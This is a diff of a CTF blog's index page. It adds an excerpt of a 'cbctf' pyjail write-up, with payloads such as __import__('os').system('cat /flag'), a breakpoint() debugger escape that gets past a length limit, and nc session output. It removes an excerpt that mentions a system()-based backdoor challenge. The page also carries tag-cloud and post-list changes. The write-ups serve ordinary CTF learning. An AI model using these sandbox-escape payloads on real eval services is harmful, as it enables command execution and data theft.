@@ -126,6 +126,62 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/01/02/cbctf/" >cbctf</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-01-02  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="pyjali"><a href="#pyjali" class="headerlink" title="pyjali"></a>pyjali</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><pre class="line-numbers language-none"><code class="language-none">__import__(&#39;os&#39;).system(&#39;cat &#x2F;flag&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><pre class="line-numbers language-none"><code class="language-none">f&quot;&#123;__import__(&#39;os&#39;).system(&#39;cat &#x2F;flag&#39;)&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>有一个字符长度限制，测试一下长度13，试了一下breakpoint可以使用，可以用breakpoint打开一个调试器去绕过这个长度限制</p>
+<pre class="line-numbers language-none"><code class="language-none">lhj@lhj-virtual-machine:~&#x2F;Desktop&#x2F;cbctf&#x2F;pwn$ nc training.0rays.club 10100
+
+ _     _______     _______ _       _____
+| |   | ____\ \   &#x2F; &#x2F; ____| |     |___ &#x2F;
+| |   |  _|  \ \ &#x2F; &#x2F;|  _| | |       |_ \
+| |___| |___  \ V &#x2F; | |___| |___   ___) |
+|_____|_____|  \_&#x2F;  |_____|_____| |____&#x2F;
+
+
+Welcome to the JBNRZ&#39;s pyjail
+Enter your expression and I will evaluate it for you.
+Example:
+  input: 1 + 1
+  Result: 2
+&gt; breakpoint()
+--Return--
+&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;None
+(Pdb) __import__(&#39;os&#39;).system(&#39;sh&#39;)
+*** SyntaxError: invalid syntax
+(Pdb) print(1)
+1
+(Pdb) __import__(&#39;os&#39;).system(&#39;cat &#x2F;flag&#39;)
+CBCTF&#123;9fc71bcf-1809-413d-98e1-41155ffd6211&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>和3 一样可以通过breakpoint</p>
+	
+	</div>
+  <a type="button" href="/2024/01/02/cbctf/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2023/12/28/hackergame2023/" >Hackergame2023</a>
 		</h3>
 		</div>
@@ -793,38 +849,6 @@ decrypted_full_combined_string <span class="token operator">=</span> <span class
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2023/09/18/cnss2023/" >cnss2023</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-09-18  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Baby-SignIn"><a href="#Baby-SignIn" class="headerlink" title="[Baby] SignIn"></a>[Baby] SignIn</h2><p>查看源代码，script.js文件中有一段document.getElementById(‘flag’).addEventListener(‘click’, function()下面是一段jsfuck混淆</p>
-<p><a target="_blank" rel="noopener" href="https://enkhee-osiris.github.io/Decoder-JSFuck/">https://enkhee-osiris.github.io/Decoder-JSFuck/</a>  得到flag</p>
-<h2 id="Baby-Backdoor"><a href="#Baby-Backdoor" class="headerlink" title="[Baby] Backdoor"></a>[Baby] Backdoor</h2><p>post传system()执行系统命令，找到flag</p>
-<h2 id="Baby-Webpack"><a href="#Baby-Webpack" class="headerlink" title="[Baby] Webpack"></a>[Baby] Webpack</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/guowenrui/p/17023732.html">https://www.cnblogs.com/guowenrui/p/17023732.html</a> 参考的这个文章</p>
-<p>安装nodejs 用reverse-sourcemap .map文件还原找到flag</p>
-<h2 id="Easy-Leak"><a href="#Easy-Leak" class="headerlink" title="[Easy] Leak"></a>[Easy] Leak</h2>
-	
-	</div>
-  <a type="button" href="/2023/09/18/cnss2023/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -889,45 +913,45 @@ decrypted_full_combined_string <span class="token operator">=</span> <span class
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
+			<li><a href="/tags/ctf-writeup/">ctf writeup<span>57</span></a></li>
 		
-			<li><a href="/tags/heap/">heap<span>13</span></a></li>
-		
-			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/httpd-pwn/">httpd pwn<span>1</span></a></li>
+			<li><a href="/tags/chroot-escape/">chroot escape<span>1</span></a></li>
 		
 			<li><a href="/tags/seccomp/">seccomp<span>3</span></a></li>
 		
-			<li><a href="/tags/misc/">misc<span>1</span></a></li>
-		
 			<li><a href="/tags/ptmalloc2/">ptmalloc2<span>8</span></a></li>
 		
-			<li><a href="/tags/fmt/">fmt<span>7</span></a></li>
+			<li><a href="/tags/heap/">heap<span>13</span></a></li>
+		
+			<li><a href="/tags/misc/">misc<span>1</span></a></li>
+		
+			<li><a href="/tags/house-of-orange/">house of orange<span>1</span></a></li>
+		
+			<li><a href="/tags/httpd-pwn/">httpd pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/rust/">rust<span>1</span></a></li>
 		
 			<li><a href="/tags/go-pwn/">go pwn<span>1</span></a></li>
 		
-			<li><a href="/tags/开源操作系统训练营2025/">开源操作系统训练营2025<span>1</span></a></li>
-		
-			<li><a href="/tags/cpp-pwn/">cpp pwn<span>3</span></a></li>
-		
 			<li><a href="/tags/iot/">iot<span>1</span></a></li>
 		
-			<li><a href="/tags/shellcode/">shellcode<span>5</span></a></li>
+			<li><a href="/tags/mips-pwn/">mips pwn<span>1</span></a></li>
 		
-			<li><a href="/tags/grpc/">grpc<span>1</span></a></li>
+			<li><a href="/tags/vm-pwn/">vm pwn<span>2</span></a></li>
 		
-			<li><a href="/tags/kernel/">kernel<span>1</span></a></li>
-		
-			<li><a href="/tags/ctf-writeup/">ctf writeup<span>57</span></a></li>
-		
-			<li><a href="/tags/tls/">tls<span>1</span></a></li>
+			<li><a href="/tags/gdb/">gdb<span>2</span></a></li>
 		
 			<li><a href="/tags/riscv-pwn/">riscv pwn<span>1</span></a></li>
 		
-			<li><a href="/tags/win-pwn/">win pwn<span>1</span></a></li>
+			<li><a href="/tags/kernel/">kernel<span>1</span></a></li>
 		
-			<li><a href="/tags/gdb/">gdb<span>2</span></a></li>
+			<li><a href="/tags/tls/">tls<span>1</span></a></li>
+		
+			<li><a href="/tags/shellcode/">shellcode<span>5</span></a></li>
+		
+			<li><a href="/tags/php-pwn/">php pwn<span>1</span></a></li>
+		
+			<li><a href="/tags/grpc/">grpc<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>24</span></a></li>
@@ -943,6 +967,10 @@ decrypted_full_combined_string <span class="token operator">=</span> <span class
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2025/10/03/ysyx-f3数电基础/" ><i class="fa fa-file-o"></i>ysyx_f3数电基础</a>
+      </li>
+    
+      <li>
         <a href="/2025/09/15/rust1/" ><i class="fa fa-file-o"></i>rust语法基础1</a>
       </li>
     
@@ -956,10 +984,6 @@ decrypted_full_combined_string <span class="token operator">=</span> <span class
     
       <li>
         <a href="/2025/04/29/hackergame2024复现/" ><i class="fa fa-file-o"></i>hackergame2024复现</a>
-      </li>
-    
-      <li>
-        <a href="/2025/04/09/Squ1rrelCTF/" ><i class="fa fa-file-o"></i>Squ1rrelCTF</a>
       </li>
     
   </ul>
